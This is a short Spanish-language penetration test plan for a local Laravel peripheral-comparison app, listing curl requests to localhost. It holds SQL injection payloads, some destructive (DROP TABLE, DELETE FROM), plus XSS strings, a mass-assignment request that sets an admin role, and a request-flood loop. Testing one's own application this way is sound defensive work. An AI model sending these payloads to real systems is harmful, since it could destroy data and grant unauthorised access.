# 🛡️ PRUEBAS DE PENETRACIÓN - FRONTEND LARAVEL

## 🎯 **VECTORES DE ATAQUE A PROBAR**

### Test 1: SQL Injection en ComparacionController
```bash
# Intento básico
curl "http://127.0.0.1:8000/comparar-perifericos?periferico1=1' OR 1=1--&periferico2=2"

# Intento avanzado
curl "http://127.0.0.1:8000/comparar-perifericos?periferico1=1; DROP TABLE usuarios;--&periferico2=2"
```

### Test 2: SQL Injection en ComparadoraController 
```bash
# Parámetros de filtros maliciosos
curl "http://127.0.0.1:8000/usuario/1' UNION SELECT * FROM usuarios--/perfil"

# Búsqueda con inyección
curl "http://127.0.0.1:8000/buscar?categoria=teclado'; DELETE FROM perifericos;--"
```

### Test 3: XSS en parámetros de entrada
```bash
# Script injection
curl "http://127.0.0.1:8000/comparar-perifericos?periferico1=<script>alert('XSS')</script>&periferico2=2"

# Event handler injection
curl "http://127.0.0.1:8000/comparar-perifericos?periferico1=1&periferico2=2' onload='alert(1)'"
```

### Test 4: Mass Assignment en PerifericoController
```bash
# Intento de crear admin
curl -X POST "http://127.0.0.1:8000/api/perifericos" \
  -H "Content-Type: application/json" \
  -d '{"nombre":"Test","precio":100,"role":"admin","is_admin":true}'
```

### Test 5: Rate Limiting
```bash
# Múltiples requests rápidos
for i in {1..20}; do curl "http://127.0.0.1:8000/comparar-perifericos?periferico1=1&periferico2=2" & done
```

---
*Tests de penetración para Laravel - 26/10/2025*